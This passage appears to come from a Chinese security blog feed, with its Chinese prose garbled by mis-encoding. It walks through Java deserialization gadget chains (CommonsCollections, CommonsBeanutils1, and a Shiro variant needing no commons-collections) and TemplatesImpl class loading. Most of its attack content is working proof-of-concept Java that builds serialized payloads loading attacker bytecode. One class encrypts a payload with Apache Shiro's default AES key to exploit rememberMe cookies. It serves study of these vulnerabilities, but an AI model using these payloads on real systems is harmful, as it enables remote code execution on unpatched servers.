class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getBytescode()&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(obj);</span><br><span class="line">        queue.add(obj);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206173016563.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206173016563.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨4.1å’Œ3.2.2æ›´æ–°äº†<code>FunctorUtils#checkUnsafeSerialization</code>ï¼Œ3.2.2é»˜è®¤æƒ…å†µä¸‹ä¼šæ£€æµ‹å¸¸è§å±é™©transformer(InstantiataTransformerã€InvokerTransformerã€PrototypeFactoryç­‰)çš„readObjectè¿›è¡Œè°ƒç”¨ï¼Œ4.1è¿™å‡ ä¸ªç±»ç›´æ¥ä¸å†å®ç°Serilalizableæ¥å£</p><h1 id="CommonsBeanutil"><a href="#CommonsBeanutil" class="headerlink" title="CommonsBeanutil"></a>CommonsBeanutil</h1><p>javaBeançš„ä»‹ç»ï¼š<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680</a></p><p>ä»ä¸­å¯ä»¥äº†è§£åˆ°getterã€setterã€å±æ€§çš„æ¦‚å¿µã€‚</p><p>åœ¨ä¸Šæ–‡ï¼Œæˆ‘ä»¬ç”¨<code>PriorityQueue#compare()</code>æ¥è§¦å‘<code>TransformingComparator#transform()</code>ã€‚é™¤äº†è¿™ç§æ–¹å¼å¤–ï¼Œè¿˜æœ‰<code>org.apache.commons.beanutils.BeanComparator.compare()</code></p><p>BeanComparator.compare()æ–¹æ³•ä»£ç å¦‚ä¸‹ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206184052378.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206184052378.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…¶ä¸­çš„getPropertyæ–¹æ³•å¯ä»¥è°ƒç”¨ä»»æ„javaBeançš„getteræ–¹æ³•ï¼ˆå½¢å¦‚<code>getName</code>)ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty(o1,<span class="built_in">this</span>.property);</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•ç”šè‡³å¯ä»¥é€’å½’æŸ¥è¯¢:<code>PropertyUtils.getProperty(o1,&quot;o2.name&quot;);</code></p><p>ç°åœ¨ååºåˆ—åŒ–é“¾ä¸ºï¼š</p><p><code>BeanComparator#compara()</code>-&gt;<code>PropertyUtils.getProperty()</code>-&gt; <code>TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass()</code></p><p><code>getOutputProperties()</code>ç¬¦åˆgetterçš„å®šä¹‰ï¼Œæ‰€ä»¥property(å±æ€§å)çš„å€¼ä¸ºOutputPropertiesæ—¶ï¼Œè§¦å‘ååºåˆ—åŒ–é“¾ã€‚PriorityQueueé˜Ÿåˆ—å’Œpropertyçš„å€¼å¯ä»¥ç”¨åå°„çš„æ–¹å¼ä¿®æ”¹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br></pre></td></tr></table></figure><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,comparator);</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206210050408.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206210050408.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é‚£ä¹ˆè¿™æ¡é“¾è·Ÿä¸Šé¢é‚£ä¸ªåªç”¨åˆ°äº†priorityQueueçš„åŒºåˆ«åœ¨å“ªï¼Ÿ</p><p>å¥½åƒåªæ˜¯ååºåˆ—åŒ–çš„å…¥å£ä»newInstanceå˜æˆäº†getOutputPropertiesï¼Ÿ</p><p>æ­£æ˜¯å› ä¸ºä¸å†éœ€è¦newInstanceä½œä¸ºå…¥å£ï¼Œä¹Ÿå°±ä¸å†éœ€è¦Invokertransformerè¿›è¡Œè°ƒç”¨ã€‚ä¹Ÿå°±æ˜¯</p><p><code>PriorityQueue#Compare()</code>-&gt;<code>TransformingComparator#transform</code>-&gt;<code>InvokerTransformer</code>-&gt;<code>TemplatesImpl#newTransformer()</code>è¿™æ®µè¿‡ç¨‹å¯ä»¥å…¨éƒ¨èˆå¼ƒæ‰ï¼Œè½¬è€Œæ¢æˆï¼š</p><p><code>PriorityQueue#compare()</code>-&gt;<code>BeanComparator#compare()</code>-&gt;<code>PropertyUtils.getProperty()</code>-&gt; <code>TemplatesImpl#getOutputProperties()</code></p><p>å› æ­¤3.2.2å’Œ4.1å°±èƒ½å¼€å¿ƒçš„æ‹¿ç€è¿™ä¸ªpayloadå»æ‰“</p><h2 id="ä¸éœ€è¦CCåº“çš„shiroCommonBeanutils"><a href="#ä¸éœ€è¦CCåº“çš„shiroCommonBeanutils" class="headerlink" title="ä¸éœ€è¦CCåº“çš„shiroCommonBeanutils"></a>ä¸éœ€è¦CCåº“çš„shiroCommonBeanutils</h2><p>shiroæœ¬èº«ä¾èµ–commons-beautilsåº“ã€‚æ‰€ä»¥ä¸Šé¢çš„payloadå¯ä»¥ç›´æ¥æ”¹é€ ç”¨æ¥æ‰“shiroã€‚</p><blockquote><p>å¦‚æœæœ¬åœ°commons-beanutilså’ŒæœåŠ¡å™¨shiroçš„CBç‰ˆæœ¬ä¸ä¸€æ ·çš„è¯ï¼ŒserialVersionUIDå°±ä¼šä¸åŒï¼Œä¹Ÿå°±ä¸å…¼å®¹ã€‚ä¹Ÿå°±æ˜¯æ‰“çš„æ—¶å€™éœ€è¦æŠŠæœ¬åœ°commons-beanutilsæ”¹æˆå’ŒæœåŠ¡å™¨ä¸€æ ·çš„ç‰ˆæœ¬</p></blockquote><p>é‚£æœåŠ¡ç«¯æ²¡æœ‰commons-collectionsåº“çš„æ—¶å€™å‘¢ï¼Ÿ</p><p>åœ¨new BeanComparatoræ—¶ï¼ŒBeanComparatoræ„é€ å‡½æ•°ä½¿ç”¨äº†ComparableComparator</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207113456298.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207113456298.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è€Œè¿™ä¸ªç±»æ¥è‡ªcommons.collectionsï¼Œæ‰€ä»¥è¦é¿å¼€ä½¿ç”¨è¿™ä¸ªç¼ºçœå‚æ•°ã€‚ä¹Ÿå°±æ˜¯è¦æ‰¾åˆ°ä¸€ä¸ªç±»æœ‰comparatoræ¥å£å’Œserializableæ¥å£</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207113534550.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207113534550.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><code>CaseInsensitiveComparator</code>ä¸ä»…å®ç°äº†ä¸Šé¢ä¸¤ä¸ªæ¥å£ï¼Œè¿˜åœ¨java.lang.Stringä¸‹ã€‚è€Œä¸”ç”¨getOutputPropertiesçš„æ–¹å¼è°ƒç”¨æ˜¯ä¸éœ€è¦ç”¨åˆ°æ¶æ„comparatorçš„ï¼Œåªéœ€è¦æ¶æ„property</p><p>æ‰€ä»¥ä¿®æ”¹Beancomparatoråˆå§‹åŒ–æ—¶çš„å‚æ•°ä¸ºCaseInsensitiveComparatorçš„å¯¹è±¡å°±è¡Œäº†ï¼š</p><p><code>final BeanComparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);</code></p><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroCommonsBeanutils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object</span></span><br><span class="line"><span class="params">            value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] getPayload(<span class="type">byte</span>[] clazzBytes) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazzBytes&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,comparator);</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"><span class="comment">// ==================</span></span><br><span class="line"><span class="comment">// ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è½¬å­—èŠ‚ç æ‰“shiro pocï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Clientattack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(org.example.ShiroCommonsBeanutils1.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] payloads = <span class="keyword">new</span> <span class="title class_">CommonsCollectionsShiro</span>().getPayload(clazz.toBytecode());</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207125223110.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207125223110.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207125113917.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207125113917.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å‚è€ƒï¼šphith0nã€Šjavaå®‰å…¨æ¼«è°ˆ(16ã€17)ã€‹</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> CC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC </tag>
            
            <tag> shiroCommonBeanutils </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java_TemplatesImplåœ¨BCELå’Œshiroä¸­çš„åˆ©ç”¨</title>
      <link href="/2022/10/07/java-templatesimpl-zai-bcel-he-shiro-zhong-de-li-yong/"/>
      <url>/2022/10/07/java-templatesimpl-zai-bcel-he-shiro-zhong-de-li-yong/</url>
      
        <content type="html"><![CDATA[<p>URLClassLoaderå¯ä»¥ä»è¿œç¨‹HTTPæœåŠ¡å™¨ä¸ŠåŠ è½½.classæ–‡ä»¶ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h1 id="JAVA-Classloader"><a href="#JAVA-Classloader" class="headerlink" title="JAVA Classloader"></a>JAVA Classloader</h1><p>å­—èŠ‚ç çš„æœ¬è´¨æ˜¯ä¸€ä¸ªå­—èŠ‚æ•°ç»„byte[]</p><h2 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h2><p>åŠ è½½classæˆ–è€…jaræ–‡ä»¶ï¼Œéƒ½ä¼šç»è¿‡ClassLoaderåŠ è½½å™¨çš„loadClassæœ¬åœ°å¯»æ‰¾ç±»,findClassè¿œç¨‹åŠ è½½ç±»ï¼ŒdefineClasså¤„ç†å­—èŠ‚ç ï¼Œä»è€Œå˜æˆçœŸæ­£çš„javaç±»ã€‚</p><p>å› ä¸ºdefineClassè¢«è°ƒç”¨æ—¶ï¼Œç±»å¯¹è±¡ä¸ä¼šè¢«åˆå§‹åŒ–ï¼Œåªæœ‰è¢«æ˜¾å¼è°ƒç”¨æ„é€ å‡½æ•°æ—¶æ‰èƒ½åˆå§‹åŒ–ã€‚è€Œä¸”defineClassæ˜¯protectç±»å‹ï¼Œæ‰€ä»¥ä½¿ç”¨åå°„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">defineClass.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><h2 id="TemplateSImpl"><a href="#TemplateSImpl" class="headerlink" title="TemplateSImpl"></a>TemplateSImpl</h2><blockquote><p>ä¾èµ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></blockquote><p>defineClassä½œç”¨åŸŸä¸å¼€æ”¾ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸ç›´æ¥ä½¿ç”¨ã€‚ä½†æœ‰ä¸€äº›ä¾‹å¤–ï¼Œæ¯”å¦‚TemplateSImplã€‚(ç±»æ–¹æ³•å¾ˆå°‘ä¼šè°ƒç”¨åˆ°é™¤publicå¤–çš„æ–¹æ³•)ï¼Œè¯¥ç±»çš„å†…éƒ¨ç±»TransletClassLoaderé‡å†™äº†defineClassæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>javaå£°æ˜æ–¹æ³•é»˜è®¤defaultï¼Œèƒ½è¢«å¤–éƒ¨è°ƒç”¨ã€‚è€Œè°ƒç”¨åˆ°TransletClassLoaderä¸ºä¸‹åˆ—è°ƒç”¨é“¾ã€‚</p><p><code>TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()-&gt; TransletClassLoader#defineClass()</code></p><p>ä½¿ç”¨åˆ°defineTransletClassesçš„å…¶å®æœ‰<code>getTransletInstanceã€getTransletClassesã€getTransletIndex</code>ä¸‰ç§ï¼Œä½†æ˜¯getTransletInstanceç”Ÿæˆçš„å¯¹è±¡ä¼šè¢«åŒ…å«äºTransformer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221129172318916.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221129172318916.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æœ€åä¸¤ä¸ªgetOutputProperties()å’ŒnewTransformeréƒ½æ˜¯publicç±»ï¼Œæ‰€ä»¥å¯ä»¥ç•¥å»æœ€åä¸€æ­¥ç›´æ¥newTransformer()å®ç°.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> is.readFields();</span><br><span class="line">        _name = (String)gf.get(<span class="string">&quot;_name&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        _bytecodes = (<span class="type">byte</span>[][])gf.get(<span 